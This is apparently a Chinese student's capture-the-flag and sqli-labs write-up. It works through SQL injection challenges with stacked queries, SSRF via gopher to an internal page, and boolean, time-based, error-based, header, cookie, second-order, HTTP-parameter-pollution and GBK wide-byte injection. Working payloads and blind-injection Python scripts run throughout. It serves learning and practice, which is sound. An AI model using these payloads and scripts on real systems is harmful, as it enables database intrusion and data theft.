sel;#(上面的图里应该是191981093114514打错了，最终结果应该是上面这行代码//到底是谁起的这个名字啊啊啊啊啊) GET到flag； 另外一种思路，从最开始看到题目的时候就在想直接输入1回显的数组是来自哪里的呢，但是最开始做的时候爆了191981093114514表就没爆words表的字段名了，因为191981093114514表里只有一个元素，所以推测回显内容是words表里的，爆words字段名 1';show columns from `words`;# 推测回显内容来自于data字段； 思路就是把words表改名为其他的名字，191981093114514改名为words，把其中的flag字段改名为id（或者在xinwords表里增加一列id），最后传入***1’ or 1=1#***使查询结果为true爆出words所有字段内容。 相关语句如下： 12345alter table [表名] add [字段名] int(***)/varchar(***) #增加列alter table [表名] drop [字段名]#删除列alter table [表名] change [字段名] [新字段名] int(***)/varchar(***)#重命名字段alter table [表名] rename to [新表名]#重命名表,to可省略rename table [表名] to [新表名]#重命名表 payload1: 11';rename table words to word;rename table `1919810931114514` to words;alter table words add id int(3);##新增一列id payload2： 121';rename table words to word;rename table `1919810931114514` to words;alter table words change flag id varchar(50);##修改flag字段名为id 2023ROIS冬令营internal这是什么，两个超链接，点一下（ ​ SQLI页面中的内容： 1234567891011121314151617&lt;?phprequire_once('config.php');if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') { highlight_file(__FILE__); die('Try to access it from internal!');}echo &quot;Welcome!\\n&quot;;$id = $_POST['id'];if (preg_match(&quot;/union| /i&quot;,$id)) die('You bad bad &gt;_&lt;');$con = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);$sql = &quot;SELECT * FROM messages WHERE id=$id&quot;; // SQLI &gt;_&lt;$res = mysqli_query($con, $sql);$message = mysqli_fetch_array($res)['message'];echo $message;#回显Try to access it from internal! if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1')用户访问的IP必须是本地IP才能进行下面的数据库操作等步骤，也就是说只有通过网页服务器内网访问。如果我们能够通过这个服务器中的另外一个不限制于内网访问的页面，把它当做跳板间接对这个仅内网访问的页面进行操作，就能进行传参等操作。也就是实现SSRF。先看另外一个页面： 123456789&lt;?phphighlight_file(__FILE__);// Hint: Do you know gopher?$url = $_POST['url'];if (preg_match(&quot;/file:|ftp:|http:|scp:|dict:/i&quot;,$url)) die('You bad bad &gt;_&lt;');$ch = curl_init($url);$res = curl_exec($ch);echo $res; curl_init()函数初始化一个curl绘会话，值传给$ch，curl_exec()函数执行一个curl会话，值传给$res。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：&quot;Do you know gopher?&quot;。emmm。。。并不知道。那就学呗。找到了一篇讲的比较详细的文章学习了一下。 gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。 gopher协议的格式： 1gopher://&lt;host&gt;:&lt;port&gt;/_后接TCP数据流 需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是%0D%0A，使用脚本或工具编码后回车换行会变成%0A，因此要多一步replace的步骤。在HTTP包的最后要加%0D%0A，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例： GET请求： 准备好一个监听机和一个用户机： nc -lp 1234监听1234端口，使用curl发送http请求curl gopher://172.17.0.1:1234/abcd，监听机收到消息为”bcd”；发送请求curl gopher://172.17.0.1:1234/aabcdnc监听到abcd。因此紧跟在&quot;&lt;PORT&gt;/&quot;字符后面的一个字符会被忽略，可换为任意一个字符。 这是一段网页源码，作用是将GET传入的name的值打印出来： 1234&lt;?php echo &quot;Hello &quot;.$_GET[&quot;name&quot;].&quot;\\n&quot;?&gt;#保存为ssrf.php 这是一个GET请求包 123GET /ssrf.php?name=Potatowo HTTP/1.1Host: 172.17.0.1#回车 经Python脚本编写，生成对应的请求包 1234567891011import urllib.parsedata = \\&quot;&quot;&quot;GET /ssrf.php?name=Margin HTTP/1.1Host: 172.17.0.1#该行要有回车，HTTP数据包结尾&quot;&quot;&quot;result = urllib.parse.quote(data)result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)#此处将&quot;%0A&quot;替换成&quot;%0D%0A&quot;print(result)#output#GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A 改为构成符合gopher协议的请求后通过curl发出请求： 12curl gopher://172.17.0.1:8080/_GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。 POST请求： 这是一段网页源码，功能不做过多赘述： 1234&lt;?php echo &quot;Hello &quot;.$_POST[&quot;name&quot;].&quot;\\n&quot;?&gt;#保存为ssrf.php 这是一个POST请求包： 1234567POST /ssrf/base/post.php HTTP/1.1host:172.17.0.1Content-Type:application/x-www-form-urlencodedContent-Length:11name=Potatowo#回车 改为构成符合gopher协议的请求后通过curl发出请求： 12curl gopher://172.17.0.1:8080/_POST%20/ssrf/base/post.php%20HTTP/1.1%0D%0Ahost%3A172.17.0.1%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0Aname%3DPotatowo%0D%0A%0D%0A#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。 现在回到本题； 既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包： 1234567891011121314151617181920212223242526import urllib.parsedata = \\&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1Content-Length: 4Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeid=1&quot;&quot;&quot;result = urllib.parse.quote(data)result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)result = result = urllib.parse.quote(result)#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码print(result)#output#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A 改为符合gopher协议的形式，注意由于curl_exec()的执行是在服务端里进行的，所以gopher://协议的地址应改为127.0.0.1:80，80端口是跑web服务的端口。 将脚本中的content进行修改，content = &quot;id=1 and 1=1&quot;，传入，结果： emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼 12if (preg_match(&quot;/union| /i&quot;,$id)) die('You bad bad &gt;_&lt;'); 看来是ban掉了union和空格。难怪，那改成content = &quot;id=1/**/and/**/1=1&quot;绕过空格过滤，回显&quot;Welcome! meow meow meow~1&quot;，改成content = &quot;id=1/**/and/**/1=2&quot;，回显&quot;Welcome! 1&quot;。sql语句判断为真会返回&quot;Welcome! meow meow meow~1&quot;，为假不含meow meow meow~，同时union被ban了，尝试用加号拼接&quot;uni&quot;,&quot;on&quot;，结果加号url编码与空格相同（悲，现在意图也比较明显了，布尔盲注。 完善脚本： 123456789101112131415161718192021222324252627282930313233import urllib.parseimport requestsurl = &quot;http://192.168.150.1:43083/curl.php&quot;for i in range(0,126): content = &quot;id=1 and (length(database())={})#&quot;.format(i) content = content.replace(&quot; &quot;, &quot;/**/&quot;)#SQL页面存在空格过滤用/**/绕过 content_length = len(content) data = \\#切记切记下面字符串每行左边要贴边，不然tab会被编码f&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1Content-Length: {content_length}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close{content}&quot;&quot;&quot; result = urllib.parse.quote(data) result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;) payload = &quot;gopher://127.0.0.1:80/_&quot;+result#用python直接传参只需要编码一次 r = requests.post(url,data={&quot;url&quot;:payload}).text #print(r) if &quot;meow&quot; in r:#如果sql返回为真，页面会显示&quot;meow meow~&quot; print(i) break#output#3 输出3，得出数据库长度为3。 123456789101112131415161718192021222324252627282930313233343536373839import urllib.parseimport requestsurl = &quot;http://192.168.150.1:43083/curl.php&quot;database = &quot;&quot;for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr(database(),{},1))={})#&quot;.format(i,j)#判断数据库名第i个字符的ascii码是否为j，是的话为真会返回&quot;meow&quot; content = content.replace(&quot; &quot;, &quot;/**/&quot;)#SQL页面存在空格过滤用/**/绕过 content_length = len(content) data = \\f&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1Content-Length: {content_length}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close{content}&quot;&quot;&quot; result = urllib.parse.quote(data) result = result.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;) payload = &quot;gopher://127.0.0.1:80/_&quot;+result r = requests.post(url,data={&quot;url&quot;:payload}).text #print(r) if &quot;meow&quot; in r: database += chr(j) print(database) break#output#r#ru#rua#数据库名为rua 同样，爆表名，因为可能存在多个表，所以使用group_concat() 123456789101112131415161718for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),{},1))={})#&quot;.format(i,j) ...........#output#f#fl#fla#flag#flag,#flag,m#flag,me#flag,mes#flag,mess#flag,messa#flag,messag#flag,message#flag,messages 盲猜flag在flag表里，爆字段名： 123456789for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 'flag'),{},1))={})#&quot;.format(i,j)#爆字段名 ...........#output#f#fl#fla#flag 已知信息： 数据库rua、表flag、字段flag，爆flag内容： 123for i in range(1,100): for j in range(32,126): content = &quot;id=1 and (ascii(substr((select group_concat(flag) from flag),{},1))={})#&quot;.format(i,j)#爆flag表内容 拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import urllib.parseimport requestsdef fuck(): url = &quot;http://192.168.150.1:43083/curl.php&quot; result=&quot;&quot; for i in range(1,1290): head=32 tail=127 while head&lt;tail: mid=(head+tail)&gt;&gt;1 sqli = &quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),{},1))&gt;{},1,0)%23&quot;.format(i,mid) sqli = &quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='rua'),{},1))&gt;{},1,0)%23&quot;.format(i,mid) sqli = &quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),{},1))&gt;{},1,0)%23&quot;.format(i,mid) sqli = &quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),{},1))&gt;{},1,0)%23&quot;.format(i,mid) id = urllib.parse.quote(sqli) id_length = len(id)+3 payload = f&quot;&quot;&quot;POST /sqli.php HTTP/1.1Host: 127.0.0.1Content-Length: {id_length}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeid={id}&quot;&quot;&quot; # print(payload) tmp = urllib.parse.quote(payload) new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;) res = 'gopher://127.0.0.1:80/_' + new dataa = { &quot;url&quot;:res } r = requests.post(url=url,data=dataa) # print(r.text) if &quot;meow meow meow&quot; in r.text: head=mid+1 else: tail=mid if head !=32: result+=chr(head) else: break print(result)fuck() 当然，看到尝试传入递增变化的数据，bp爆破有时候也不失为一种方法（会用工具真的很重要（哭 （感谢LinTu提供的思路） 浏览器发送一次请求，bp抓包。记住python出payload的时候要url编码两次，传到Intruder。 Intruder集束炸弹走起，两个爆破点一个是需判断字符的位置(从1开始)，一个是比较的ascii码(从32到126)。开始爆破 异样流量数据包对应Payload2按照Payload1顺序编码成字符，就是对应的flag了，因为bp是多线程，所以也不会很慢。也算提供了一种新思路吧。 2023ROIS夏令营sqli靶场先试单双引号，有报错说明原结构被破坏，则为该引号闭合，都没反应，可能是数字型。再加注释符(–、–+、#都有可能，注意浏览器中从表单提交可能被url编码，可以从hackbar或者bp提交表单)，如果还是报错，则可能存在括号闭合，加括号报错消失之后试下两个语句，or 1=1，or 1=0以及order by ...后者查列数，前者如果结果有所不同则存在布尔注入利用，之后可尝试联合注入、布尔盲注，如果页面始终都没发生变化，则试下时间注入。不存在报错将所有可能情况都试下(' or 1=1/0#、&quot; or 1=1/0#、&quot;) or 1=1/0#、') or 1=1/0#、')) or 1=1/0#、&quot;)) or 1=1/0#、) 常见闭合： 1'、 &quot;、')、&quot;)、'))、&quot;)) level9发现不管输入什么页面显示的东西都是一样的，这个时候布尔盲注就不适合我们用。布尔盲注适合页面对于错误和正确结果有不同反应。如果页面一直不变这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了if()函数和sleep()函数。if(a,sleep(10),1)如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串。(%3C和%3E是&lt;&gt;，被编码了hhh) 可以看到如果判断长度不为8，刷的一下就加载完了，但是如果数据库名长度等于八就延迟十秒 后面的操作就类似了 在利用python编写脚本的时候要利用到time模块： 12345678910111213141516171819import timeimport requestsurl = 'http://124.70.99.199:3456/Less-9/'def sqli(): length = 0 for i in range(1,15): start_time = time.time() payload = f&quot;&quot;&quot;?id=1' and if(length(database())={i},sleep(2),1)--+&quot;&quot;&quot; r = requests.get(url+payload) end_time = time.time() exec_time = end_time - start_time if exec_time&gt;2: print(i) breaksqli() level17报错注入： 123456789101112131415161718updatexml(target_xml,xpath_string,new_value)#target_xml:需要更新的xml数据，可以是xml类型的列或变量#xpath_string:xpath表达式，用于指定要更新的节点或属性#new_value:新的值， 用于替换目标节点或属性的值#示例：update your_table set xml_culumn = updatexml(xml_column,'/root/user[1]/name','Potatowo') where id = 1;#上述示例中your_table是要更新的表，xml_column是包含xml数据的列名,/root/user[1]/name是xpath表达式，指定要更新的节点路径，'Potatowo'是设置的新的值extractvalue(xml_data,xpath_string)#xml_data：xml数据，可以是xml类型的列或变量#xpath_string:xpath表达式，用于指定要提取的节点#函数根据提供的xpath表达式在xml数据中查找匹配的节点，并返回该节点的文本值#一个有效的xpath表达式应该满足以下要求：#以节点测试、函数、运算符或路径表达式开头#路径表达式应以节点轴或节点名称开始#若不满足xpath语法，则会报错，如果xpath为sql语句，mysql会执行，并将执行结果返回在报错中 测试注入点的时候发现无论如何都没有反应，都只出现上图的情况，当用户名为’admin’或’Dumb’时密码输入什么都行，懵逼了挺久的，然后看了眼这个 啊原来是修改密码啊。。。真tm 既然是修改密码，后端一定存在update语句，修改的是password，猜测传入的password存在引号闭合，随手试了下， ，当然此处的用户名必须是admin或者Dumb，到最后一步查表内容时出问题了 看了眼大佬博客了解到mysql修改和查询不能是同一张表，因此可以引入一个临时表(详情去看另一篇博客)，然后又踩坑(不过还好，报错的意思就是说临时表必须起别名，问题不大 一开始还在纳闷怎么没有admin，观察后发现好像输出字数被限制了，如果想尽可能完整获取数据库中的信息，可以用not in运算符把以及显示出来的用户名排除掉 如下，查出来的满满都是admin（，看来懵逼时瞎尝试的次数不少（ 换成updatexml()函数试下，注意新加入的’*****‘参数 想了一下，之前能够回显错误信息的不是都可以用报错注入吗？(脑袋发光)，好像比盲注效率高了不少 这道题看大佬博客好像都审计了一眼源代码，于是跟着学习了下， 1234567891011121314151617181920212223242526function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;'&quot; . mysql_real_escape_string($value) . &quot;'&quot;; } else { $value = intval($value); } return $value; } 1234if (get_magic_quotes_gpc()) { $value = stripslashes($value); } 其中get_magic_quotes_gpc()函数的作用是判断get_magic_quotes_gpc()是否开启，如果开启的话会给用户传入的信息添加上转义字符’\\‘，，stringslashes()则是去掉转义字符，这个方法在新版本的php中已经被废弃了，也盲学一下，增长见识。 HTTP头注入：看一眼源代码 12345678910111213141516171819202122232425262728293031$sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) { echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;'; $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)&quot;; mysql_query($insert); //echo 'Your IP ADDRESS is: ' .$IP; echo &quot;&lt;/font&gt;&quot;; //echo &quot;&lt;br&gt;&quot;; echo '&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;'; echo 'Your User Agent is: ' .$uagent; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo '&lt;img src=&quot;../images/flag.jpg&quot; /&gt;'; echo &quot;&lt;br&gt;&quot;; } else { echo '&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;'; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo '&lt;img src=&quot;../images/slap.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; } 一开始的页面，随便输一个显示本机IP，从源代码可以看出得先登陆成功才会显示uagent，就试admin，源代码不含闭合，是数字型的，试了下admin or 1=1--+不行，试密码吧，试来试去最后居然还是最后忘记填密码了登陆成功的。。。密码为空。。。 成功显示出uagent，看到代码这一行： 1$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)&quot;; 和上一题一样，uagent单引号闭合，没有查询语句，可以试试报错注入，因为IP变量不可控(不可按预期方法控制)，uname这里不是admin就没法登录也就没法显示uagent，指向很明确了，user agent就是注入点，单引号闭合， 成功报错，注意到原来语句的VALUE存在左括号，因此注入时要额外增加一个右括号保证语句的完整。 或者加and ' 确实没密码。。。 level19和level18差不多，只是注入点从uagent变成了referer level20:123456789101112131415161718$sql=&quot;SELECT * FROM users WHERE username='$cookee' LIMIT 0,1&quot;;$result=mysql_query($sql);if (!$result) { die('Issue with your mysql: ' . mysql_error()); }$row = mysql_fetch_array($result);if($row) { echo '&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;'; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo '&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;'; echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo 'Your ID:' .$row['id']; } 单引号闭合username=cookie，因此只需要对cookie进行闭合后注入恶意语句即可 level21:和上一题基本没差，就是在cookie上多了个base64编码过程，然后查询语句闭合方式变为') 1234567891011121314151617181920$cookee = base64_decode($cookee);echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;$sql=&quot;SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1&quot;;$result=mysql_query($sql);if (!$result) { die('Issue with your mysql: ' . mysql_error()); }$row = mysql_fetch_array($result);if($row) { echo '&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;'; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo '&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;'; echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo 'Your ID:' .$row['id']; } level22：同上题，改成双引号闭合罢了 level23： 单引号输进去报错，但是加注释报错仍然存在，看了眼源代码，注释被过滤掉了 12345678$id=$_GET['id'];//filter the comments out so as to comments should not work$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id); emmm，当时的万能密码怎么说来着，1' or '1'='1那会没去仔细深究为啥长这样，突然就明白了()，当存在注释符过滤时最后的’1会和原sql语句的引号闭合，保证sql语句的完整性 构造payload： 123id=1' and extractvalue(1,concat(1,(select database()))) or '1'='1或者用and '闭合后面的引号也行id=1' and extractvalue(1,concat(1,(select database()))) and ' 这里是报错注入所以就不用太在意and、or逻辑关系 (前面报错注入做太爽了后面才注意到可以直接联合注入，无所谓，报错注入真好用) level24目前最牛的一级 代码审计 源代码大致有主页、修改密码、注册新用户页面。看到存在mysql_escape_string()过滤函数存在，开始搜寻不存在过滤的变量 诶嘿，这不是就传入了个SESSION没有过滤吗 1234567#pass_change.php# Validating the user input........ $username= $_SESSION[&quot;username&quot;]; $curr_pass= mysql_real_escape_string($_POST['current_password']); $pass= mysql_real_escape_string($_POST['password']); $re_pass= mysql_real_escape_string($_POST['re_password']); 并且下面的查询语句就是对$username变量进行查询，只要能改变这个SESSION的值便可以间接对SQL语句进行操作，但是SESSION是存放在服务端的，客户端没法直接进行修改，不急，继续看代码 1234567891011121314151617181920212223242526#login.phpfunction sqllogin(){ $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]); $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]); $sql = &quot;SELECT * FROM users WHERE username='$username' and password='$password'&quot;;//$sql = &quot;SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'&quot;; $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( '); $row = mysql_fetch_row($res); //print_r($row) ; if ($row[1]) { return $row[1]; } else { return 0; }}$login = sqllogin();if (!$login== 0) { $_SESSION[&quot;username&quot;] = $login; setcookie(&quot;Auth&quot;, 1, time()+3600); /* expire in 15 Minutes */ header('Location: logged-in.php');} 从login.php这里的代码就能看出SESSION的值取决于变量$login的值，变量$login的值取决于用户在登录时的用户名(row的第一个字段)，那就慢慢变得有点头绪了，只要创建一个新用户，控制新用户用户名就能间接控制SESSION。进而达到控制数据库的目的。 逻辑理到这里了突然就卡壳了，受限于之前的惯性思维一直以为是要获取数据库中的数据，想了很久没想出个所以然来，去看了眼题解，发现这种注入被称为二次注入，当以admin'#的身份登录后修改其密码，实际上就能修改admin的密码 SQL语句如下： 1$sql = &quot;UPDATE users SET PASSWORD='$pass' where username='admin'# ' and password='$curr_pass' &quot;; 结果是打完之后忘记admin'#的密码了。。。等我晚上重启一下数据库。。 军训归来（，新建一个新用户admin'# 用admin'#登录 修改其密码为114514，根据sql语句分析，此时应该修改了admin用户的密码 成功登录admin level25一个简单的双写过滤，payload： 1?id=1' anandd extractvalue(1,concat(1,(select database())))--+ level26空格过滤，or and过滤，注释符过滤 注释符过滤前面提到可以通过闭合后引号解决，空格过滤在此之前只接触过/**/，才疏学浅，结果发现/**/也被过滤了（呜呜呜呜 去找了找网上的资料，如果空格被过滤了可以用如下字符替代： 123456%a0：非断行空格%0a：新建一行%0b：Tab(垂直)%0c：新的一页%0d：return%09：Tab(水平) 这里%a0和%0b可行，payload： 1?id=1'%a0anandd%a0extractvalue(1,concat(1,(select%a0database())))%a0oorr'1'='1 在网上看到一种神奇的写法，记个笔记： 1?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1))||'0 level27payload： 依旧对空格过滤，但是这回上面提到的几个都行，select存在过滤，selEct大写绕过 1?id=1'%0aand%0aupdatexml(1,(concat(1,(selEct%0adatabase()))),1)%0aand%0a' level28没有报错信息，报错注入行不通了，试下盲注，空格依旧使用%0a过滤，payload： 1?id=1%27%0aand%0alength(database())=8%0aor%0a%271%27=%272 这里就要注意or和and之间的逻辑关系了，上面两种是正确的注入逻辑，下面两种是错误的注入逻辑 时间盲注也行，但是可以用布尔盲注为什么要用时间盲注呢（笑 level29测试单引号出现报错加注释报错消失，也没有任何的过滤。。 payload： 1?id=1%27%20and%20extractvalue(1,concat(1,(select%20database())))--+ Protected By The World’s Best Firewall。。。emmm 感觉没那么简单，看了眼源代码，咋还有个login.php和hacked.php，找遍网页也没出现这俩，手动进login.php，看起来像是隐藏关卡？ 还多了两个pdf链接，应该是提示之类的，先不看，直接刚一下 测试了下单引号双引号闭合，都炸了，如下 啊？试了很久发现除了最中规中矩的纯数字，其他通通都会寄。。有点意思，那就看下源代码 有个白名单，如果传入不是纯数字就跳转到hacked.php，emmm…不急往下看 1234567891011121314function whitelist($input){ $match = preg_match(&quot;/^\\d+$/&quot;, $input); if($match) { //echo &quot;you are good&quot;; //return $match; } else { header('Location: hacked.php'); //echo &quot;you are bad&quot;; }} 把query_string(http://host/?par1=var1&amp;par2=var2&amp;...中’?’之后的部分)以’&amp;’分开然后截取每一部分的前两个字符判断是不是’id’，如果是的话截取该部分等号之后的东西。。。说了那么多，所以，不就是返回传入的参数id吗？？？？ 123456789101112131415161718// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).function java_implimentation($query_string){ $q_s = $query_string; $qs_array= explode(&quot;&amp;&quot;,$q_s); foreach($qs_array as $key =&gt; $value) { $val=substr($value,0,2); if($val==&quot;id&quot;) { $id_value=substr($value,3,30); return $id_value; echo &quot;&lt;br&gt;&quot;; break; } }} 嘶。。这意思是id必须是纯数字？没法子了，网页给了两个pdf，一个404了，另一个配合我的工地英语和翻译器食用 12345$qs = $_SERVER['QUERY_STRING'];$hint=$qs;$id1=java_implimentation($qs);//echo $id1;whitelist($id1); 最后那个pdf的内容提炼出来就是这样一张表： 可以看到搭建在apache服务器上的php服务对于传入多个相同名字的参数，服务器只解析最后一个，所以$_GET['id']变量实际上是最后一个id参数，但是根据waf的意思，实际上过滤的是最先出现的参数id，对第二个id参数进行注入就行了 level30表关卡没啥好说的，双引号闭合联合注入： 主要看里关： 同29关，HPP参数污染，把单引号换成双引号 level31表关： 里关： level32直接就是把引号给转义了 1234567function check_addslashes($string){ $string = preg_replace('/'. preg_quote('\\\\') .'/', &quot;\\\\\\\\\\\\&quot;, $string); //escape any backslash $string = preg_replace('/\\'/i', '\\\\\\'', $string); //escape single quote with a backslash $string = preg_replace('/\\&quot;/', &quot;\\\\\\&quot;&quot;, $string); //escape double quote with a backslash return $string;} 通常情况下来说用户输入的字符串永远无法将原SQL语句的单引号闭合，通常情况下这里是不存在SQL注入的，但是注意到数据库使用的是GBK编码： 1mysql_query(&quot;SET NAMES gbk&quot;); 宽字节的格式就是在地址后面加一个%df，再加单引号，可以通过上面的测试发现，在单引号之前PHP会自动加一个\\（反斜杠），因为反斜杠的编码为%5c，所以自动转义为'，而在GBK编码中，%df5c是繁体字“連”，由于汉字是双字节，所以这里’之前的\\就会被吃掉消失，那么会造成单引号成功逃逸，爆出MySQL数据库的错误。 level33同32 level34在POST里进行宽字节注入 level35虽然使用addslashes()进行了转义，但是id变量并没有用引号闭合， 主要影响到爆字段名等之后需要引号的部分： 再加上0x level36使用mysql_real_escape_string()函数来转义特殊字符，包括单双引号 12345function check_quotes($string){ $string= mysql_real_escape_string($string); return $string;} level37 level38正常单引号闭合注入ok，感觉没那么容易去看了眼源代码： 123$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;/* execute multi query */if (mysqli_multi_query($con1, $sql)) 是存在mysqli_multi_query()，可执行多条sql语句，因此也可以进行堆叠注入 插入新用户potato 